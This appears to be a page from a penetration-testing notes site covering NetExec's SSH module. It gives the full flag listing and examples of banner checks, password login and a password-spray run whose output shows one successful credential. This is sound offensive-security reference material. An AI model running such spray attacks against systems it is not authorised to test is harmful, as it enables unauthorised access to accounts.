---
title : "SSH"
# pre : ' '
description : "Own stuff using SSH."
date : 2023-10-05T12:26:49+02:00
# hidden : true
# draft : true
weight : 70
tags : ['Framework', 'SSH']
---

---

## Installation

Install [NetExec]({{< ref "../netexec" >}}).

## Usage

```plain
netexec ssh [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--verbose] [--debug] [--no-progress] [--log LOG] [-6] [--dns-server DNS_SERVER] [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [-u USERNAME [USERNAME ...]]
                   [-p PASSWORD [PASSWORD ...]] [-id CRED_ID [CRED_ID ...]] [--ignore-pw-decoding] [--no-bruteforce] [--continue-on-success] [--gfail-limit LIMIT] [--ufail-limit LIMIT] [--fail-limit LIMIT] [-k] [--use-kcache]
                   [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST] [--server {https,http}] [--server-host HOST] [--server-port PORT] [--connectback-host CHOST] [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options]
                   [--key-file KEY_FILE] [--port PORT] [--ssh-timeout SSH_TIMEOUT] [--sudo-check] [--sudo-check-method {sudo-stdin,mkfifo}] [--get-output-tries GET_OUTPUT_TRIES] [--codec CODEC] [--no-output] [-x COMMAND]
                   target [target ...]
```

## Flags

```plain
positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)

options:
  -h, --help            show this help message and exit
  --key-file KEY_FILE   Authenticate using the specified private key. Treats the password parameter as the key's passphrase.
  --port PORT           SSH port (default: 22)
  --ssh-timeout SSH_TIMEOUT
                        SSH connection timeout (default: 15)
  --sudo-check          Check user privilege with sudo
  --sudo-check-method {sudo-stdin,mkfifo}
                        method to do with sudo check (mkfifo is non-stable, probably you need to execute once again if it failed)' (default: sudo-stdin)
  --get-output-tries GET_OUTPUT_TRIES
                        Number of times with sudo command tries to get results (default: 5)

Generic:
  Generic options for nxc across protocols

  -t THREADS, --threads THREADS
                        set how many concurrent threads to use (default: 256)
  --timeout TIMEOUT     max timeout in seconds of each thread
  --jitter INTERVAL     sets a random delay between each authentication

Output:
  Options to set verbosity levels and control output

  --verbose             enable verbose output
  --debug               enable debug level information
  --no-progress         do not displaying progress bar during scan
  --log LOG             export result into a custom file

DNS:
  -6                    Enable force IPv6
  --dns-server DNS_SERVER
                        Specify DNS server (default: Use hosts file & System DNS)
  --dns-tcp             Use TCP instead of UDP for DNS queries
  --dns-timeout DNS_TIMEOUT
                        DNS query timeout in seconds (default: 3)

Authentication:
  Options for authenticating

  -u USERNAME [USERNAME ...], --username USERNAME [USERNAME ...]
                        username(s) or file(s) containing usernames
  -p PASSWORD [PASSWORD ...], --password PASSWORD [PASSWORD ...]
                        password(s) or file(s) containing passwords
  -id CRED_ID [CRED_ID ...]
                        database credential ID(s) to use for authentication
  --ignore-pw-decoding  Ignore non UTF-8 characters when decoding the password file
  --no-bruteforce       No spray when using file for username and password (user1 => password1, user2 => password2)
  --continue-on-success
                        continues authentication attempts even after successes
  --gfail-limit LIMIT   max number of global failed login attempts
  --ufail-limit LIMIT   max number of failed login attempts per username
  --fail-limit LIMIT    max number of failed login attempts per host

Kerberos:
  Options for Kerberos authentication

  -k, --kerberos        Use Kerberos authentication
  --use-kcache          Use Kerberos authentication from ccache file (KRB5CCNAME)
  --aesKey AESKEY [AESKEY ...]
                        AES key to use for Kerberos Authentication (128 or 256 bits)
  --kdcHost KDCHOST     FQDN of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter

Servers:
  Options for nxc servers

  --server {https,http}
                        use the selected server (default: https)
  --server-host HOST    IP to bind the server to (default: 0.0.0.0)
  --server-port PORT    start the server on the specified port
  --connectback-host CHOST
                        IP for the remote system to connect back to

Modules:
  Options for nxc modules

  -M MODULE, --module MODULE
                        module to use
  -o MODULE_OPTION [MODULE_OPTION ...]
                        module options
  -L, --list-modules    list available modules
  --options             display module options

Command Execution:
  Options for executing commands

  --codec CODEC         Set encoding used (codec) from the target's output. If errors are detected, run chcp.com at the target, map the result with https://docs.python.org/3/library/codecs.html#standard-encodings and then execute
                        again with --codec and the corresponding codec (default: utf-8)
  --no-output           do not retrieve command output
  -x COMMAND            execute the specified command
```

## Examples

### Checking SSH availability

```plain
$ nxc ssh 100.96.36.115  
SSH         100.96.36.115   22     100.96.36.115    [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4
```

### Authentication with Password

```plain
$ nxc ssh 100.96.36.115 -u crypt0rr -p Welkom1234
SSH         100.96.36.115   22     100.96.36.115    [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4
SSH         100.96.36.115   22     100.96.36.115    [+] crypt0rr:Welkom1234  - shell access!
```

### Password Spray SSH

{{%resources fa_icon_class="far fa-file" pattern=".*(txt)"/%}}

```plain
$ nxc ssh 100.96.36.115 -u usernames.txt -p passwords.txt 
SSH         100.96.36.115     22     100.96.36.115      [*] SSH-2.0-OpenSSH_8.4p1 Ubuntu-6ubuntu2.1
SSH         100.96.36.115     22     100.96.36.115      [-] 11111:admin Authentication failed.
SSH         100.96.36.115     22     100.96.36.115      [-] 11111:root Authentication failed.
SSH         100.96.36.115     22     100.96.36.115      [-] 11111:admin Authentication failed.
SSH         100.96.36.115     22     100.96.36.115      [-] 11111:root Authentication failed.
SSH         100.96.36.115     22     100.96.36.115      [-] 11111:Admin Authentication failed.
SSH         100.96.36.115     22     100.96.36.115      [-] 11111:Admin Authentication failed.
SSH         100.96.36.115     22     100.96.36.115      [-] 11111:x-admin Authentication failed.
[...]
SSH         100.96.36.115     22     100.96.36.115      [-] administrator:administrator Authentication failed.
SSH         100.96.36.115     22     100.96.36.115      [-] administrator:welkom1234 Authentication failed.
SSH         100.96.36.115     22     100.96.36.115      [+] administrator:x-admin 
```
